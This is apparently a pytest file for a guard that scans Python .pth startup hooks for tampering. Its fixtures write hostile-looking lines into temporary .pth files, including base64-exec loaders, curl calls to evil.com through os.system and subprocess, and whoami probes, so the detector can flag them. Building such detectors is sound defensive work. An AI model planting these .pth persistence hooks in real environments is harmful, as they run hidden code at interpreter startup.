"""
Tests for StartupHookGuard — Environment Integrity Verification.
"""

import os
import tempfile
from unittest.mock import patch

from qwed_sdk.guards.environment_guard import StartupHookGuard


class TestStartupHookGuard:
    """Tests for .pth startup hook detection."""

    def test_clean_environment(self):
        """Environment with no unknown .pth files should pass."""
        guard = StartupHookGuard()
        with tempfile.TemporaryDirectory() as tmpdir:
            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()
        assert result["verified"] is True
        assert result["status"] == "CLEAN_ENVIRONMENT"
        assert result["suspicious_hooks"] == []
        assert "scanned_directories" in result

    def test_detects_malicious_pth_file(self):
        """Should detect an unknown .pth file in a scanned directory."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            # Plant a suspicious .pth file
            malicious_path = os.path.join(tmpdir, "litellm_init.pth")
            with open(malicious_path, "w") as f:
                f.write("import os; exec(base64.b64decode('...'))")

            # Mock site dirs to point to our temp dir
            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is False
            assert result["status"] == "COMPROMISED"
            assert len(result["suspicious_hooks"]) == 1
            assert "litellm_init.pth" in result["suspicious_hooks"][0]
            assert any("exec" in f for f in result["content_findings"])
            assert any("base64" in f for f in result["content_findings"])

    def test_allows_standard_pth_files(self):
        """Standard .pth files (setuptools, pip, etc.) should be allowed."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            # Create standard safe .pth files
            for name in ["setuptools.pth", "distutils-precedence.pth", "pip.pth"]:
                with open(os.path.join(tmpdir, name), "w") as f:
                    f.write(f"# {name}\n")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is True
            assert result["status"] == "CLEAN_ENVIRONMENT"
            assert len(result["suspicious_hooks"]) == 0

    def test_custom_allowlist(self):
        """Custom allowlist should whitelist additional .pth files."""
        guard = StartupHookGuard(allowed_pth_files={"my_company.pth"})

        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "my_company.pth"), "w") as f:
                f.write("import my_company\n")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is True

    def test_content_scanning_detects_network_calls(self):
        """Should flag .pth files containing network/subprocess imports."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            backdoor = os.path.join(tmpdir, "sysmon.pth")
            with open(backdoor, "w") as f:
                f.write("import subprocess\nimport socket\nos.system('curl http://evil.com')\n")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is False
            assert any("subprocess" in f for f in result["content_findings"])
            assert any("socket" in f for f in result["content_findings"])
            assert any("os" in f and "system" in f for f in result["content_findings"])

    def test_content_scanning_disabled(self):
        """When scan_contents=False, any unknown .pth is flagged regardless of content."""
        guard = StartupHookGuard(scan_contents=False)

        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "unknown.pth"), "w") as f:
                f.write("# harmless comment")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is False
            assert len(result["suspicious_hooks"]) == 1
            assert len(result["content_findings"]) == 0  # No content scan

    def test_harmless_unknown_pth_flagged_even_with_clean_content(self):
        """Unknown .pth is flagged even with harmless content (not allowlisted)."""
        guard = StartupHookGuard(scan_contents=True)

        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "my_tool.pth"), "w") as f:
                f.write("# just a path entry\n/opt/my_tool/lib\n")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            # Not allowlisted = always flagged (defense in depth)
            assert result["verified"] is False
            assert len(result["suspicious_hooks"]) == 1
            assert len(result["content_findings"]) == 0  # No malicious patterns found

    def test_allowlisted_clean_file_passes(self):
        """Allowlisted .pth with clean content should PASS."""
        guard = StartupHookGuard(scan_contents=True)

        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "setuptools.pth"), "w") as f:
                f.write("# standard setuptools\n")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is True
            assert len(result["suspicious_hooks"]) == 0

    def test_multiple_suspicious_files(self):
        """Should report all suspicious .pth files, not just the first."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            for i in range(3):
                with open(os.path.join(tmpdir, f"backdoor_{i}.pth"), "w") as f:
                    f.write("import os; os.popen('whoami')\n")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is False
            assert len(result["suspicious_hooks"]) == 3

    def test_hex_encoded_payload_detection(self):
        """Should detect hex-encoded payloads in .pth files."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "obfuscated.pth"), "w") as f:
                f.write("data = '\\x68\\x65\\x6c\\x6c\\x6f'\n")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is False
            assert any("\\\\x" in f or "x[0-9a-fA-F]" in f for f in result["content_findings"])

    def test_tampered_allowlisted_file_detected(self):
        """Allowlisted .pth with malicious content should be flagged (tampered)."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            # Simulate a tampered pip.pth
            with open(os.path.join(tmpdir, "pip.pth"), "w") as f:
                f.write("import subprocess; subprocess.call(['curl', 'http://evil.com'])\n")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is False
            assert len(result["suspicious_hooks"]) == 1
            assert any("subprocess" in f for f in result["content_findings"])

    def test_message_mentions_patterns_when_found(self):
        """Message should mention 'malicious patterns' when content findings exist."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "evil.pth"), "w") as f:
                f.write("exec(base64.b64decode('...'))")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert "malicious patterns" in result["message"]

    def test_message_neutral_when_no_patterns(self):
        """Message should NOT mention 'malicious patterns' for unknown-but-clean files."""
        guard = StartupHookGuard(scan_contents=False)

        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "unknown.pth"), "w") as f:
                f.write("# harmless")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert "malicious patterns" not in result["message"]
            assert "allowlist" in result["message"]

    def test_unreadable_file_reported(self):
        """Unreadable .pth files should report the actual error type."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            filepath = os.path.join(tmpdir, "locked.pth")
            with open(filepath, "w") as f:
                f.write("something")
            # Make unreadable
            os.chmod(filepath, 0o000)

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            # Restore permissions for cleanup
            os.chmod(filepath, 0o644)

            assert result["verified"] is False
            assert any("Unable to read" in f for f in result["content_findings"])

    def test_empty_site_dir(self):
        """Empty site-packages directory should pass cleanly."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is True
            assert result["scanned_directories"] == [tmpdir]
